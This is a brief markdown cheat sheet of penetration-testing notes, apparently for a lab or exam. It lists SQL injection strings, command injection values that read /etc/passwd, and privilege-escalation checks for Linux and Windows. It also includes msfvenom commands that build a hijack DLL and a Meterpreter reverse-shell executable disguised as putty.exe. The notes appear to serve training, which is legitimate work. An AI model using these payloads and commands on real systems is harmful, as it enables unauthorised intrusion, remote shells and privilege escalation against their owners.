## 
```

SQL injection: GET METHOD(in url)

```

## 🍖️ & 🥔️
```

--script=banner / http-enum / robots.txt
ports to check for: 2222,4242,9999,3389,8080


CMD INJECTION: ;whoami / ;cat /etc/passwd
(get onto the box)
ssh-keygen -t rsa -b 4096 (upload public one)

ssh -i (specify a different private key)


GET = ADDR BAR(+?)
POST = USING THE TEXT BOXES


SQL INJECTION:
OR 1=1
OR 1=1;#
union select (# of culums)@@version


Malicious Upload:
CAN upload and CAN access upload folder


Reverse Engineering:
Should be good?
LInux:
Find JMP ESP on that specific box(if gdb is on box then you prolly have to Reverse Engineer)


RSYSLOG:
remote linux logging
/etc/rsyslog.conf


Windows Privledge Escalation:
Scheduled tasks -- sort by description
msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\' -f dll > SSPICLI.dll
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.*.* lport=4444 -b "\x00" -f exe > putty.exe
REGISTRY(HKLM/HKCU)


Linux Priveledge Escalation:
sudo -l (GTFOBins)(make sure sudo command is in the right place)
find / -type f -perm (/2000||/4000) -ls 2>/dev/null
check /etc/sudoers

```

## 
```



```

